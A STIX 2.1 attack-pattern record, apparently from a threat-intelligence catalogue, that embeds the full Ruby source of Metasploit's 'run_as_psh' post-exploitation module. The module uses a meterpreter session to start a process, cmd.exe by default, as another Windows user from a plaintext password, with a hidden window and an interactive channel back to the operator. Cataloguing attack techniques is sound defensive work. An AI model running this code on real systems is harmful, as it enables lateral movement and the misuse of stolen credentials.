{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8f40d272-dabc-4538-8b06-03f6abb3e4d3",
    "created": "2024-08-14T16:33:04.98512Z",
    "modified": "2024-08-14T16:33:04.985123Z",
    "name": "Windows \\Run As\\ Using Powershell",
    "description": "This module will start a process as another user using powershell. 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/run_as_psh.rb",
            "external_id": "run_as_psh.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Powershell\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows \\'Run As\\' Using Powershell',\n        'Description' => %q{ This module will start a process as another user using powershell. },\n        'License' => MSF_LICENSE,\n        'Author' => ['p3nt4'],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('USER', [true, 'User to run executable as', nil]),\n        OptString.new('PASS', [true, 'Password of user', nil]),\n        OptString.new('DOMAIN', [false, 'Domain of user', '']),\n        OptString.new('EXE', [true, 'Executable to run', 'cmd.exe']),\n        OptString.new('ARGS', [false, 'Arguments', nil]),\n        OptString.new('PATH', [true, 'Working Directory', 'C:\\\\']),\n        OptBool.new('CHANNELIZE', [true, 'Chanelize output, required for reading output or interracting', true]),\n        OptBool.new('INTERACTIVE', [true, 'Run interactively', true]),\n        OptBool.new('HIDDEN', [true, 'Hide the window', true])\n      ]\n    )\n  end\n\n  def run\n    raise 'Powershell is required' if !have_powershell?\n\n    # Variable Setup\n    user = datastore['user']\n    pass = datastore['pass']\n    domain = datastore['domain']\n    exe = datastore['exe'].gsub('\\\\', '\\\\\\\\\\\\\\\\')\n    inter = datastore['interactive']\n    args = datastore['args']\n    path = datastore['path'].gsub('\\\\', '\\\\\\\\\\\\\\\\')\n    channelized = datastore['channelize']\n    hidden = datastore['hidden']\n    if user.include? '\\\\'\n      domain = user.split('\\\\')[0]\n      user = user.split('\\\\')[1]\n    end\n    # Check if session is interactive\n    if !session.interacting && inter\n      print_error('Interactive mode can only be used in a meterpreter console')\n      print_error(\"Use 'run post/windows/manage/run_as_psh USER=x PASS=X EXE=X' or 'SET INTERACTIVE false'\")\n      raise 'Invalide console'\n    end\n    # Prepare powershell script\n    scr = \"$pw = convertto-securestring '#{pass}' -asplaintext -force; \"\n    scr << \"$pp = new-object -typename System.Management.Automation.PSCredential -argumentlist '#{domain}\\\\#{user}',$pw; \"\n    scr << \"Start-process '#{exe}' -WorkingDirectory '#{path}' -Credential $pp\"\n    if args && args != ''\n      scr << \" -argumentlist '#{args}' \"\n    end\n    if hidden\n      print_status('Hidden mode may not work on older powershell versions, if it fails, try HIDDEN=false')\n      scr << ' -WindowStyle hidden'\n    end\n    scr = \" -c \\\"#{scr}\\\"\"\n    # Execute script\n    p = client.sys.process.execute('powershell.exe', scr,\n                                   'Channelized' => channelized,\n                                   'Desktop' => false,\n                                   'Session' => false,\n                                   'Hidden' => true,\n                                   'Interactive' => inter,\n                                   'InMemory' => false,\n                                   'UseThreadToken' => false)\n    print_status(\"Process #{p.pid} created.\")\n    print_status(\"Channel #{p.channel.cid} created.\") if p.channel\n    # Process output\n    if inter && p.channel\n      client.console.interact_with_channel(p.channel)\n    elsif p.channel\n      data = p.channel.read\n      print_line(data) if data\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}